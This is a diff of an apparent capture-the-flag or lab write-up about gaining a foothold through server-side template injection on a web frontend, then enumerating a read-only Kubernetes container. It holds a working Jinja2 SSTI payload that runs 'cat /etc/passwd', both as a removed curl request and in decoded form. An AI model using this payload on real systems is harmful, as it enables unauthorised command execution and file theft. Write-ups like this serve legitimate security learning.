@@ -53,15 +53,18 @@ Connection: close
 ```
 <a id="item-one"></a>
 ## Step 1: Exploring the Read-Only Web Frontend
-First, we access the web frontend and exploit a SSTI to gain a foot hold on the system.
+First, we access the web frontend and exploit a SSTI to gain a foot hold on the system. The text box is subject to a basic Template injection. 
+We cant test injection for read:
 
-Example from Burp:
-```sh
-curl -i -s -k -X $'POST' \
-    -H $'Host: 192.168.64.18:30007' -H $'Content-Length: 153' -H $'Cache-Control: max-age=0' -H $'Upgrade-Insecure-Requests: 1' -H $'Origin: http://192.168.64.18:30007' -H $'Content-Type: application/x-www-form-urlencoded' -H $'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.159 Safari/537.36' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7' -H $'Referer: http://192.168.64.18:30007/get_response' -H $'Accept-Encoding: gzip, deflate, br' -H $'Accept-Language: en-US,en;q=0.9' -H $'Connection: close' \
-    --data-binary $'conversation=A&user_input=a+%7B%7B+self._TemplateReference__context.cycler.__init__.__globals__.os.popen%28%27cat+%2Fetc%2Fpasswd%27%29.read%28%29+%7D%7D' \
-    $'http://192.168.64.18:30007/get_response'
 ```
+a {{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('cat /etc/passwd').read() }}
+```
+We see an error when trying to write a file.
+```bash
+touch hi.txt
+touch: cannot touch 'hi.txt': Read-only file system
+```
+
 ## Step 2: Enumerating our envioment 
 
 By checking the environment variables we can deduce that we are in a Kubernetes environment. 
@@ -71,11 +74,6 @@ KUBERNETES_PORT_443_TCP_PROTO=tcp
 KUBERNETES_PORT_443_TCP_ADDR=10.96.0.1
 ```
 
-We see an error when trying to write a file.
-```bash
-touch hi.txt
-touch: cannot touch 'hi.txt': Read-only file system
-```
 Observations:
 * The environment variables suggest we're on a Kubernetes node.
 * Standard paths are available, but no write access to the filesystem.
